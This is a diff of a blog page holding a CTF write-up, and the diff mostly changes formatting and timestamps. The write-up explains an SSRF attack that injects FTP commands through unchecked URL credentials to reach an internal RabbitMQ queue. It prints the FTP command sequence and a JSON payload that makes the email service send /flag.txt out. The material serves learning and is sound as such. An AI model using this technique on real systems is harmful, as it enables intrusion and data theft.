@@ -61,7 +61,7 @@
 
 
 
-    <meta property="article:published_time" content="2020-04-28 00:48:12 -0600 -0600" />
+    <meta property="article:published_time" content="2020-04-28 00:48:12 -0600 MDT" />
 
 
 
@@ -160,7 +160,7 @@ if (!doNotTrack) {
 
 
 <p>Uniquely, we are given the source code for the problem. The source code shows us that the program has 6 services:</p>
-<pre><code>\services
+<pre tabindex="0"><code>\services
     \api 
     \email (email server, sends emails based on rabbitmq queue)
     \ftp
@@ -179,45 +179,44 @@ if (!doNotTrack) {
 <p>Now the hard part - how <em>do we</em> ask the server? How do we send a request to the server to send us the email with the flag as an attachment?</p>
 <p>I spent a long time trying to figure out how to send a rogue request to the rabbitmq server that will send us the email we want. I spent hours just browsing through the source code, not really paying attention&hellip;</p>
 <p>Until I came across this piece of code in the <code>api/index.ts</code> file:</p>
-<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-js" data-lang="js">    <span style="color:#a6e22e">app</span>.<span style="color:#a6e22e">get</span>(<span style="color:#e6db74">&#34;/image&#34;</span>, <span style="color:#66d9ef">async</span> (<span style="color:#a6e22e">req</span>, <span style="color:#a6e22e">res</span>) =&gt; {
-        <span style="color:#66d9ef">let</span> { <span style="color:#a6e22e">url</span> } <span style="color:#f92672">=</span> <span style="color:#a6e22e">req</span>.<span style="color:#a6e22e">query</span>;
-        <span style="color:#66d9ef">if</span> (<span style="color:#66d9ef">typeof</span> <span style="color:#a6e22e">url</span> <span style="color:#f92672">!==</span> <span style="color:#e6db74">&#34;string&#34;</span>) {
-            <span style="color:#66d9ef">return</span> <span style="color:#a6e22e">res</span>.<span style="color:#a6e22e">status</span>(<span style="color:#ae81ff">500</span>).<span style="color:#a6e22e">send</span>(<span style="color:#e6db74">&#34;Bad body&#34;</span>);
-        }
-
-        <span style="color:#66d9ef">let</span> <span style="color:#a6e22e">parsed</span> <span style="color:#f92672">=</span> <span style="color:#66d9ef">new</span> <span style="color:#a6e22e">URL</span>(<span style="color:#a6e22e">url</span>);
-
-        <span style="color:#66d9ef">let</span> <span style="color:#a6e22e">image</span><span style="color:#f92672">:</span> <span style="color:#a6e22e">Buffer</span>;
-        <span style="color:#66d9ef">if</span> (<span style="color:#a6e22e">parsed</span>.<span style="color:#a6e22e">protocol</span> <span style="color:#f92672">===</span> <span style="color:#e6db74">&#34;http:&#34;</span> <span style="color:#f92672">||</span> <span style="color:#a6e22e">parsed</span>.<span style="color:#a6e22e">protocol</span> <span style="color:#f92672">===</span> <span style="color:#e6db74">&#34;https:&#34;</span>) {
-            <span style="color:#66d9ef">const</span> <span style="color:#a6e22e">imageReq</span> <span style="color:#f92672">=</span> <span style="color:#66d9ef">await</span> <span style="color:#a6e22e">fetch</span>(<span style="color:#a6e22e">parsed</span>.<span style="color:#a6e22e">toString</span>(), { <span style="color:#a6e22e">method</span><span style="color:#f92672">:</span> <span style="color:#e6db74">&#34;GET&#34;</span> });
-            <span style="color:#a6e22e">image</span> <span style="color:#f92672">=</span> <span style="color:#66d9ef">await</span> (<span style="color:#a6e22e">imageReq</span> <span style="color:#a6e22e">as</span> <span style="color:#a6e22e">any</span>).<span style="color:#a6e22e">buffer</span>();
-        } 
-        
-         <span style="color:#75715e">//THIS PART HERE!
-</span><span style="color:#75715e"></span>        <span style="color:#66d9ef">else</span> <span style="color:#66d9ef">if</span> (<span style="color:#a6e22e">parsed</span>.<span style="color:#a6e22e">protocol</span> <span style="color:#f92672">===</span> <span style="color:#e6db74">&#34;ftp:&#34;</span>) {
-            <span style="color:#66d9ef">let</span> <span style="color:#a6e22e">username</span> <span style="color:#f92672">=</span> decodeURIComponent(<span style="color:#a6e22e">parsed</span>.<span style="color:#a6e22e">username</span>);
-            <span style="color:#66d9ef">let</span> <span style="color:#a6e22e">password</span> <span style="color:#f92672">=</span> decodeURIComponent(<span style="color:#a6e22e">parsed</span>.<span style="color:#a6e22e">password</span>);
-            <span style="color:#66d9ef">let</span> <span style="color:#a6e22e">filename</span> <span style="color:#f92672">=</span> decodeURIComponent(<span style="color:#a6e22e">parsed</span>.<span style="color:#a6e22e">pathname</span>);
-            <span style="color:#66d9ef">let</span> <span style="color:#a6e22e">ftpClient</span> <span style="color:#f92672">=</span> <span style="color:#66d9ef">await</span> <span style="color:#a6e22e">connectFtp</span>({
-                <span style="color:#a6e22e">host</span><span style="color:#f92672">:</span> <span style="color:#a6e22e">parsed</span>.<span style="color:#a6e22e">hostname</span>,
-                <span style="color:#a6e22e">port</span><span style="color:#f92672">:</span> <span style="color:#a6e22e">parsed</span>.<span style="color:#a6e22e">port</span> <span style="color:#f92672">!==</span> <span style="color:#e6db74">&#34;&#34;</span> <span style="color:#f92672">?</span> parseInt(<span style="color:#a6e22e">parsed</span>.<span style="color:#a6e22e">port</span>) <span style="color:#f92672">:</span> <span style="color:#66d9ef">undefined</span>,
-                <span style="color:#a6e22e">user</span><span style="color:#f92672">:</span> <span style="color:#a6e22e">username</span> <span style="color:#f92672">!==</span> <span style="color:#e6db74">&#34;&#34;</span> <span style="color:#f92672">?</span> <span style="color:#a6e22e">username</span> <span style="color:#f92672">:</span> <span style="color:#66d9ef">undefined</span>,
-                <span style="color:#a6e22e">password</span><span style="color:#f92672">:</span> <span style="color:#a6e22e">password</span> <span style="color:#f92672">!==</span> <span style="color:#e6db74">&#34;&#34;</span> <span style="color:#f92672">?</span> <span style="color:#a6e22e">password</span> <span style="color:#f92672">:</span> <span style="color:#66d9ef">undefined</span>,
-            });
-            <span style="color:#a6e22e">image</span> <span style="color:#f92672">=</span> <span style="color:#66d9ef">await</span> <span style="color:#a6e22e">ftpClient</span>.<span style="color:#a6e22e">get</span>(<span style="color:#a6e22e">filename</span>);
-        } <span style="color:#66d9ef">else</span> {
-            <span style="color:#66d9ef">return</span> <span style="color:#a6e22e">res</span>.<span style="color:#a6e22e">status</span>(<span style="color:#ae81ff">500</span>).<span style="color:#a6e22e">send</span>(<span style="color:#e6db74">&#34;Bad image url&#34;</span>);
-        }
-                <span style="color:#66d9ef">if</span> (<span style="color:#f92672">!</span><span style="color:#a6e22e">isPNG</span>(<span style="color:#a6e22e">image</span>)) {
-            <span style="color:#66d9ef">return</span> <span style="color:#a6e22e">res</span>.<span style="color:#a6e22e">status</span>(<span style="color:#ae81ff">500</span>).<span style="color:#a6e22e">send</span>(<span style="color:#e6db74">&#34;Bad image (not a png)&#34;</span>);
-        }
-
-        <span style="color:#a6e22e">res</span>.<span style="color:#a6e22e">type</span>(<span style="color:#e6db74">&#34;.png&#34;</span>).<span style="color:#a6e22e">status</span>(<span style="color:#ae81ff">200</span>).<span style="color:#a6e22e">send</span>(<span style="color:#a6e22e">image</span>);
-    })
-
-    <span style="color:#a6e22e">app</span>.<span style="color:#a6e22e">listen</span>(<span style="color:#e6db74">&#34;4101&#34;</span>);
-
-</code></pre></div><p>Image: the profile picture we would upload when we register as a new user. For HTTP and HTTPS protocols it&rsquo;s a simple GET method, not much to do there. But for FTP?
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-js" data-lang="js"><span style="display:flex;"><span>    <span style="color:#a6e22e">app</span>.<span style="color:#a6e22e">get</span>(<span style="color:#e6db74">&#34;/image&#34;</span>, <span style="color:#66d9ef">async</span> (<span style="color:#a6e22e">req</span>, <span style="color:#a6e22e">res</span>) =&gt; {
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">let</span> { <span style="color:#a6e22e">url</span> } <span style="color:#f92672">=</span> <span style="color:#a6e22e">req</span>.<span style="color:#a6e22e">query</span>;
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">if</span> (<span style="color:#66d9ef">typeof</span> <span style="color:#a6e22e">url</span> <span style="color:#f92672">!==</span> <span style="color:#e6db74">&#34;string&#34;</span>) {
+</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">return</span> <span style="color:#a6e22e">res</span>.<span style="color:#a6e22e">status</span>(<span style="color:#ae81ff">500</span>).<span style="color:#a6e22e">send</span>(<span style="color:#e6db74">&#34;Bad body&#34;</span>);
+</span></span><span style="display:flex;"><span>        }
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">let</span> <span style="color:#a6e22e">parsed</span> <span style="color:#f92672">=</span> <span style="color:#66d9ef">new</span> <span style="color:#a6e22e">URL</span>(<span style="color:#a6e22e">url</span>);
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">let</span> <span style="color:#a6e22e">image</span><span style="color:#f92672">:</span> <span style="color:#a6e22e">Buffer</span>;
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">if</span> (<span style="color:#a6e22e">parsed</span>.<span style="color:#a6e22e">protocol</span> <span style="color:#f92672">===</span> <span style="color:#e6db74">&#34;http:&#34;</span> <span style="color:#f92672">||</span> <span style="color:#a6e22e">parsed</span>.<span style="color:#a6e22e">protocol</span> <span style="color:#f92672">===</span> <span style="color:#e6db74">&#34;https:&#34;</span>) {
+</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">const</span> <span style="color:#a6e22e">imageReq</span> <span style="color:#f92672">=</span> <span style="color:#66d9ef">await</span> <span style="color:#a6e22e">fetch</span>(<span style="color:#a6e22e">parsed</span>.<span style="color:#a6e22e">toString</span>(), { <span style="color:#a6e22e">method</span><span style="color:#f92672">:</span> <span style="color:#e6db74">&#34;GET&#34;</span> });
+</span></span><span style="display:flex;"><span>            <span style="color:#a6e22e">image</span> <span style="color:#f92672">=</span> <span style="color:#66d9ef">await</span> (<span style="color:#a6e22e">imageReq</span> <span style="color:#a6e22e">as</span> <span style="color:#a6e22e">any</span>).<span style="color:#a6e22e">buffer</span>();
+</span></span><span style="display:flex;"><span>        } 
+</span></span><span style="display:flex;"><span>        
+</span></span><span style="display:flex;"><span>         <span style="color:#75715e">//THIS PART HERE!
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>        <span style="color:#66d9ef">else</span> <span style="color:#66d9ef">if</span> (<span style="color:#a6e22e">parsed</span>.<span style="color:#a6e22e">protocol</span> <span style="color:#f92672">===</span> <span style="color:#e6db74">&#34;ftp:&#34;</span>) {
+</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">let</span> <span style="color:#a6e22e">username</span> <span style="color:#f92672">=</span> decodeURIComponent(<span style="color:#a6e22e">parsed</span>.<span style="color:#a6e22e">username</span>);
+</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">let</span> <span style="color:#a6e22e">password</span> <span style="color:#f92672">=</span> decodeURIComponent(<span style="color:#a6e22e">parsed</span>.<span style="color:#a6e22e">password</span>);
+</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">let</span> <span style="color:#a6e22e">filename</span> <span style="color:#f92672">=</span> decodeURIComponent(<span style="color:#a6e22e">parsed</span>.<span style="color:#a6e22e">pathname</span>);
+</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">let</span> <span style="color:#a6e22e">ftpClient</span> <span style="color:#f92672">=</span> <span style="color:#66d9ef">await</span> <span style="color:#a6e22e">connectFtp</span>({
+</span></span><span style="display:flex;"><span>                <span style="color:#a6e22e">host</span><span style="color:#f92672">:</span> <span style="color:#a6e22e">parsed</span>.<span style="color:#a6e22e">hostname</span>,
+</span></span><span style="display:flex;"><span>                <span style="color:#a6e22e">port</span><span style="color:#f92672">:</span> <span style="color:#a6e22e">parsed</span>.<span style="color:#a6e22e">port</span> <span style="color:#f92672">!==</span> <span style="color:#e6db74">&#34;&#34;</span> <span style="color:#f92672">?</span> parseInt(<span style="color:#a6e22e">parsed</span>.<span style="color:#a6e22e">port</span>) <span style="color:#f92672">:</span> <span style="color:#66d9ef">undefined</span>,
+</span></span><span style="display:flex;"><span>                <span style="color:#a6e22e">user</span><span style="color:#f92672">:</span> <span style="color:#a6e22e">username</span> <span style="color:#f92672">!==</span> <span style="color:#e6db74">&#34;&#34;</span> <span style="color:#f92672">?</span> <span style="color:#a6e22e">username</span> <span style="color:#f92672">:</span> <span style="color:#66d9ef">undefined</span>,
+</span></span><span style="display:flex;"><span>                <span style="color:#a6e22e">password</span><span style="color:#f92672">:</span> <span style="color:#a6e22e">password</span> <span style="color:#f92672">!==</span> <span style="color:#e6db74">&#34;&#34;</span> <span style="color:#f92672">?</span> <span style="color:#a6e22e">password</span> <span style="color:#f92672">:</span> <span style="color:#66d9ef">undefined</span>,
+</span></span><span style="display:flex;"><span>            });
+</span></span><span style="display:flex;"><span>            <span style="color:#a6e22e">image</span> <span style="color:#f92672">=</span> <span style="color:#66d9ef">await</span> <span style="color:#a6e22e">ftpClient</span>.<span style="color:#a6e22e">get</span>(<span style="color:#a6e22e">filename</span>);
+</span></span><span style="display:flex;"><span>        } <span style="color:#66d9ef">else</span> {
+</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">return</span> <span style="color:#a6e22e">res</span>.<span style="color:#a6e22e">status</span>(<span style="color:#ae81ff">500</span>).<span style="color:#a6e22e">send</span>(<span style="color:#e6db74">&#34;Bad image url&#34;</span>);
+</span></span><span style="display:flex;"><span>        }
+</span></span><span style="display:flex;"><span>                <span style="color:#66d9ef">if</span> (<span style="color:#f92672">!</span><span style="color:#a6e22e">isPNG</span>(<span style="color:#a6e22e">image</span>)) {
+</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">return</span> <span style="color:#a6e22e">res</span>.<span style="color:#a6e22e">status</span>(<span style="color:#ae81ff">500</span>).<span style="color:#a6e22e">send</span>(<span style="color:#e6db74">&#34;Bad image (not a png)&#34;</span>);
+</span></span><span style="display:flex;"><span>        }
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>        <span style="color:#a6e22e">res</span>.<span style="color:#a6e22e">type</span>(<span style="color:#e6db74">&#34;.png&#34;</span>).<span style="color:#a6e22e">status</span>(<span style="color:#ae81ff">200</span>).<span style="color:#a6e22e">send</span>(<span style="color:#a6e22e">image</span>);
+</span></span><span style="display:flex;"><span>    })
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">app</span>.<span style="color:#a6e22e">listen</span>(<span style="color:#e6db74">&#34;4101&#34;</span>);
+</span></span></code></pre></div><p>Image: the profile picture we would upload when we register as a new user. For HTTP and HTTPS protocols it&rsquo;s a simple GET method, not much to do there. But for FTP?
 It asks for the username, password and filename, <em>unchecked</em>, then asynchronously asks the server for the image that matches the filename that we specified.
 FTP is a text-based protocol, and since username and password fields are passed to it unchecked, we could definitely inject some protocol commands, custom data (something like <code>{to: &quot;email@example.com&quot;, attachments:[{path:&quot;/flag.txt&quot;}]}</code>), and make FTP send requests that were never intended to be sent.</p>
 <p>Here&rsquo;s something I learned in my internet computing class about the FTP protocol: FTP connections have two modes : &ldquo;Active&rdquo; and &ldquo;Passive&rdquo;. I&rsquo;ll give a heavily truncated explanation of the two modes (if you&rsquo;re interested in learning more about the FTP protocol, check out the <a href="https://tools.ietf.org/html/rfc959">RFC specifications on it</a>):</p>
@@ -231,11 +230,11 @@ FTP is a text-based protocol, and since username and password fields are passed 
 <li>Craft a payload that will tell the rabbitmq email queue server to email to us, with flag.txt as the attachment. Hide it in the profile picture (make sure its a png). Upload whatever picture it is as our profile picture.</li>
 </ul>
 <p>Here&rsquo;s the payload I crafted (a classic SSRF):</p>
-<pre><code>{&quot;to&quot;:&quot;yourEmailGoesHere@example.com&quot;,&quot;text&quot;:&quot;Hello would you like a flag&quot;,&quot;attachments&quot;:[{&quot;path&quot;:&quot;/flag.txt&quot;}]}
+<pre tabindex="0"><code>{&#34;to&#34;:&#34;yourEmailGoesHere@example.com&#34;,&#34;text&#34;:&#34;Hello would you like a flag&#34;,&#34;attachments&#34;:[{&#34;path&#34;:&#34;/flag.txt&#34;}]}
 </code></pre><ul>
 <li>Through the username field, input several FTP commands to make the FTP server send our payload to the rabbitmq server. Here, I have made a file called &ldquo;payload.txt&rdquo; that has the post request data with the payload in it:</li>
 </ul>
-<pre><code>PASS blah
+<pre tabindex="0"><code>PASS blah
 PORT 255,255,255,255,80
 STOR payload.txt
 PORT 172,32,56,72,0, 15672      &lt;-----rabbitmq server and port
@@ -243,7 +242,7 @@ RETR payload.txt
 </code></pre><ul>
 <li>Hopefully, the rabbitmq server will send us an email!</li>
 </ul>
-<pre><code>PCTF{not_that_contrived_i_guess}
+<pre tabindex="0"><code>PCTF{not_that_contrived_i_guess}
 </code></pre><p>NOTE: Doing it this way means the FTP server was establishing a connection with the rabbitmq one. However, multiple times I tried this the TCP connection would close immediately after I send my request! I worked around this by sending in a bunch of garbage in my payload.txt file alongside the actual payload, so that at least the TCP connection would have to spend time sending all of that data(think: an unending stream of AAAAAs), and persist long enough for the reponse to be recieved.</p>
 <p>This was a fun way to learn how FTP servers work and how protocols of the internet operate! I&rsquo;m upset that I didn&rsquo;t have the time to participate when it happened, but nonetheless this was a great challenge :)</p>
 <p>Jam</p>
@@ -259,7 +258,7 @@ RETR payload.txt
 
             <p><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="feather feather-file-text"><path d="M14 2H6a2 2 0 0 0-2 2v16a2 2 0 0 0 2 2h12a2 2 0 0 0 2-2V8z"></path><polyline points="14 2 14 8 20 8"></polyline><line x1="16" y1="13" x2="8" y2="13"></line><line x1="16" y1="17" x2="8" y2="17"></line><polyline points="10 9 9 9 8 9"></polyline></svg>1171 Words</p>
 
-            <p><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="feather feather-calendar"><rect x="3" y="4" width="18" height="18" rx="2" ry="2"></rect><line x1="16" y1="2" x2="16" y2="6"></line><line x1="8" y1="2" x2="8" y2="6"></line><line x1="3" y1="10" x2="21" y2="10"></line></svg>2020-04-27 23:48 -0700</p>
+            <p><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="feather feather-calendar"><rect x="3" y="4" width="18" height="18" rx="2" ry="2"></rect><line x1="16" y1="2" x2="16" y2="6"></line><line x1="8" y1="2" x2="8" y2="6"></line><line x1="3" y1="10" x2="21" y2="10"></line></svg>2020-04-28 00:48 -0600</p>
         </div>
 
         
@@ -322,7 +321,7 @@ RETR payload.txt
 
 
 
-<script type="text/javascript" src="https://jamvie.net/bundle.min.a0f363fdf81cdc5cfacc447a79c33189eb000d090336cd04aac8ee256f423b3133b836c281944c19c75e38d0b0b449f01ce5807e37798b7ac94ac1db51983fc4.js" integrity="sha512-oPNj/fgc3Fz6zER6ecMxiesADQkDNs0EqsjuJW9COzEzuDbCgZRMGcdeONCwtEnwHOWAfjd5i3rJSsHbUZg/xA=="></script>
+<script type="text/javascript" src="https://jamvie.net/bundle.min.af5a3e743efae0c74305dc03080fb4bd5ae8f1a60160b3599ab59639ad6c182d763fb4238e72a726f48319ad132a4cdc9cd51fac5462e8a25dc0ba096f547038.js" integrity="sha512-r1o&#43;dD764MdDBdwDCA&#43;0vVro8aYBYLNZmrWWOa1sGC12P7QjjnKnJvSDGa0TKkzcnNUfrFRi6KJdwLoJb1RwOA=="></script>
     
 <script type="application/javascript">
 var doNotTrack = false;
